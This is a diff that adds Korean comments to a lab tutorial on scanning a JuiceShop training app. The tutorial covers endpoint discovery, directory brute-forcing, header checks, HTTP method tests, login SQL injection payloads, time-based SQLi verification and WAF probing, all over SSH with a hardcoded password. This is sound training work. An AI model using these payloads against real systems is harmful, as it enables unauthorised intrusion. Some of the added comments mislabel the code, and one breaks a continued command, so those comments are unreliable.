@@ -138,17 +138,19 @@ sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \
 
 ### 2.2 대상 정보 수집 (스파이더링 대체)
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # JuiceShop 엔드포인트 자동 수집 (API 기반 스파이더링)
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== JuiceShop 엔드포인트 수집 ==="
 
 # 메인 페이지에서 링크 추출
-curl -s http://localhost:3000/ | grep -oP 'href="[^"]*"' | sort -u | head -20
+curl -s http://localhost:3000/ | grep -oP 'href="[^"]*"' | sort -u | head -20  # silent 모드
 echo "---"
 
 # API 엔드포인트 탐색
-for ep in rest/products search api/SecurityQuestions rest/user/whoami; do
+for ep in rest/products search api/SecurityQuestions rest/user/whoami; do  # 반복문 시작
   STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$ep)
   echo "$ep -> $STATUS"
 done
@@ -156,7 +158,7 @@ done
 echo "---"
 
 # Swagger/OpenAPI 문서 존재 확인
-for path in api-docs swagger.json openapi.json; do
+for path in api-docs swagger.json openapi.json; do     # 반복문 시작
   STATUS=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$path)
   echo "$path -> $STATUS"
 done
@@ -165,9 +167,11 @@ ENDSSH
 
 ### 2.3 디렉토리 브루트포스
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # 일반적인 관리 경로 점검
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== 디렉토리/파일 존재 점검 ==="
 
 PATHS=(
@@ -178,7 +182,7 @@ PATHS=(
   "wp-admin" "phpmyadmin" "server-status"
 )
 
-for p in "${PATHS[@]}"; do
+for p in "${PATHS[@]}"; do                             # 반복문 시작
   CODE=$(curl -s -o /dev/null -w "%{http_code}" -m 3 http://localhost:3000/$p)
   if [ "$CODE" != "404" ] && [ "$CODE" != "000" ]; then
     echo "[${CODE}] /$p"
@@ -193,11 +197,13 @@ ENDSSH
 
 ### 3.1 nikto 기본 스캔
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # nikto가 설치된 환경에서 실행 (또는 Docker)
 # 여기서는 nikto 대체로 수동 헤더/설정 점검 수행
 
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== 웹서버 보안 헤더 점검 (nikto 스타일) ==="
 
 # 응답 헤더 전체 수집
@@ -222,8 +228,10 @@ ENDSSH
 
 ### 3.2 서버 정보 노출 점검
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== 서버 정보 노출 점검 ==="
 
 # Server 헤더
@@ -237,7 +245,7 @@ echo "X-Powered-By: ${POWERED:-'노출 없음'}"
 # 에러 페이지에서 정보 노출
 echo "---"
 echo "=== 에러 페이지 정보 노출 ==="
-curl -s http://localhost:3000/nonexistent-page-12345 | head -5
+curl -s http://localhost:3000/nonexistent-page-12345 | head -5  # silent 모드
 
 echo "---"
 echo "=== 특수 경로 점검 ==="
@@ -254,8 +262,10 @@ ENDSSH
 
 ### 3.3 HTTP 메서드 점검
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== HTTP 메서드 점검 ==="
 
 # OPTIONS 메서드로 허용 메서드 확인
@@ -263,7 +273,7 @@ ALLOW=$(curl -sI -X OPTIONS http://localhost:3000/ | grep -i "allow:")
 echo "Allow: ${ALLOW:-'OPTIONS 응답 없음'}"
 
 # 위험한 메서드 테스트
-for method in PUT DELETE TRACE CONNECT PATCH; do
+for method in PUT DELETE TRACE CONNECT PATCH; do       # 반복문 시작
   CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://localhost:3000/)
   echo "$method -> $CODE"
 done
@@ -276,9 +286,11 @@ ENDSSH
 
 ### 4.1 sqlmap 기본 사용법
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # SQL Injection 점검 자동화 (sqlmap 스타일의 수동 점검)
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== SQL Injection 자동 점검 ==="
 
 # 1. 검색 파라미터 테스트
@@ -291,7 +303,7 @@ PAYLOADS=(
 )
 
 echo "--- 검색 엔드포인트 ---"
-for payload in "${PAYLOADS[@]}"; do
+for payload in "${PAYLOADS[@]}"; do                    # 반복문 시작
   ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
   CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/rest/products/search?q=${ENCODED}")
   echo "Payload: $payload -> HTTP $CODE"
@@ -300,10 +312,10 @@ done
 echo ""
 echo "--- 로그인 엔드포인트 ---"
 # 로그인 SQL Injection 테스트
-for email in "' OR 1=1--" "admin'--" "' UNION SELECT 1,2,3,4,5,6,7,8,9--"; do
+for email in "' OR 1=1--" "admin'--" "' UNION SELECT 1,2,3,4,5,6,7,8,9--"; do  # 반복문 시작
   RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
     -H "Content-Type: application/json" \
-    -d "{\"email\":\"$email\",\"password\":\"test\"}" | python3 -c "
+    -d "{\"email\":\"$email\",\"password\":\"test\"}" | python3 -c "  # 요청 데이터(body)
 import json,sys
 try:
   d = json.load(sys.stdin)
@@ -322,9 +334,11 @@ ENDSSH
 
 ### 4.2 자동 점검 스크립트 작성
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # 종합 자동 점검 스크립트
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 cat << 'SCRIPT' > /tmp/auto_scan.sh
 #!/bin/bash
 TARGET="http://localhost:3000"
@@ -349,7 +363,7 @@ done
 
 # 2. 정보 노출 점검
 echo "[2] 정보 노출 점검" >> $REPORT
-for path in ".git/HEAD" ".env" "package.json" "api-docs" "swagger.json"; do
+for path in ".git/HEAD" ".env" "package.json" "api-docs" "swagger.json"; do  # 반복문 시작
   CODE=$(curl -s -o /dev/null -w "%{http_code}" $TARGET/$path)
   if [ "$CODE" = "200" ]; then
     echo "  [FAIL] /$path 노출 (HTTP $CODE)" >> $REPORT
@@ -362,7 +376,7 @@ done
 echo "[3] SQL Injection 기본 점검" >> $REPORT
 SQLI_RESP=$(curl -s -X POST $TARGET/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"'\'' OR 1=1--","password":"x"}')
+  -d '{"email":"'\'' OR 1=1--","password":"x"}')       # 요청 데이터(body)
 if echo "$SQLI_RESP" | grep -q "authentication"; then
   echo "  [CRITICAL] 로그인 SQLi 취약" >> $REPORT
 else
@@ -383,7 +397,7 @@ echo "점검 완료: $(date)" >> $REPORT
 cat $REPORT
 SCRIPT
 
-chmod +x /tmp/auto_scan.sh
+chmod +x /tmp/auto_scan.sh                             # 파일 권한 변경
 bash /tmp/auto_scan.sh
 ENDSSH
 ```
@@ -403,8 +417,10 @@ ENDSSH
 
 ### 5.2 오탐 검증 실습
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== 오탐 검증: 시간 기반 SQLi ==="
 
 # 정상 요청 응답 시간 측정
@@ -418,10 +434,10 @@ SQLI_TIME=$(curl -s -o /dev/null -w "%{time_total}" \
 echo "SQLi 페이로드: ${SQLI_TIME}s"
 
 # 판별
-python3 -c "
+python3 -c "                                           # Python 코드 실행
 normal = float('$NORMAL_TIME')
 sqli = float('$SQLI_TIME')
-diff = sqli - normal
+diff = sqli - normal                                   # 파일 차이 비교
 print(f'응답 시간 차이: {diff:.2f}s')
 if diff > 2.5:
     print('판정: 정탐 가능성 높음 (SLEEP 실행된 것으로 추정)')
@@ -433,10 +449,12 @@ ENDSSH
 
 ### 5.3 결과 정리 및 우선순위 분류
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # 스캔 결과를 CVSS 기반으로 분류
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
-python3 << 'PYEOF'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
+python3 << 'PYEOF'                                     # Python 스크립트 실행
 findings = [
     {"id": "V-001", "name": "SQL Injection (로그인)", "cvss": 9.8, "severity": "Critical"},
     {"id": "V-002", "name": "보안 헤더 누락 (CSP)", "cvss": 4.3, "severity": "Medium"},
@@ -449,7 +467,7 @@ findings.sort(key=lambda x: x["cvss"], reverse=True)
 
 print(f"{'ID':<8} {'취약점':<30} {'CVSS':<6} {'심각도':<10}")
 print("-" * 60)
-for f in findings:
+for f in findings:                                     # 반복문 시작
     print(f"{f['id']:<8} {f['name']:<30} {f['cvss']:<6} {f['severity']:<10}")
 
 print(f"\n총 {len(findings)}건 발견")
@@ -467,10 +485,12 @@ ENDSSH
 
 ### 6.1 Nuclei 스타일 커스텀 템플릿
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
 # Nuclei YAML 템플릿 스타일의 점검 스크립트
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
-python3 << 'PYEOF'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
+python3 << 'PYEOF'                                     # Python 스크립트 실행
 import json, subprocess, urllib.request, urllib.parse
 
 TARGET = "http://localhost:3000"
@@ -522,7 +542,7 @@ templates = [
 print(f"{'템플릿 ID':<25} {'심각도':<10} {'결과':<10}")
 print("-" * 50)
 
-for t in templates:
+for t in templates:                                    # 반복문 시작
     try:
         req = urllib.request.Request(TARGET + t["path"])
         resp = urllib.request.urlopen(req, timeout=5)
@@ -547,8 +567,10 @@ ENDSSH
 
 ### 7.1 WAF 존재 여부 확인
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== WAF 탐지 점검 ==="
 
 # 1. 일반 요청 vs 악성 요청 응답 비교
